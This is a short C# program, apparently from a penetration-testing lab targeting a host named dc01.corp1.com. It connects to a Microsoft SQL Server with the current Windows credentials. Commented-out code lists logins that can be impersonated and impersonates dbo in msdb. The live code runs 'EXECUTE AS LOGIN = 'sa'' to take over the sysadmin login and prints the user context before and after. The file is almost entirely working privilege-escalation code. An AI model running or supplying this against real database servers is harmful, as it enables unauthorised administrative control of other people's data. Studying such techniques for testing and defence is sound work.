using System;
using System.Data.SqlClient;

namespace SqlImpEnum
{
    class Program
    {
        static void Main(string[] args)
        {
            //HARDCODED SERVER FQDN HERE
            String sqlServer = "dc01.corp1.com";
            //Default DB name on MS SQL
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            //See if any users in the DB Instance are able to be immpersonated and print out the username
            /*
            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read() == true)
            {
                Console.WriteLine("Logins that can be impersonated: " + reader[0]);
            }
            reader.Close();
            */
          
            String queryUser = "SELECT SYSTEM_USER";
                        
            //display our current user before impersonation
            Console.WriteLine("Before Impersonation");
            SqlCommand command = new SqlCommand(queryUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of: " + reader[0]);
            reader.Close();

            //See if our current AD user can impersonate sa

            String executeas = "EXECUTE AS LOGIN = 'sa';";

            command = new SqlCommand(executeas, con);
            reader = command.ExecuteReader();
            reader.Close();

            Console.WriteLine("After Impersonation");

            command = new SqlCommand(queryUser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of: " + reader[0]);
            reader.Close();
            
            
            //Check DBO impersonation
            /*
            String executeas = "use msdb; EXECUTE AS USER = 'dbo';";
            SqlCommand command = new SqlCommand(executeas, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            Console.WriteLine("After Impersonation");

            String queryUser = "SELECT USER_NAME();";
            command = new SqlCommand(queryUser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of: " + reader[0]);
            reader.Close(); */
        }
    }
}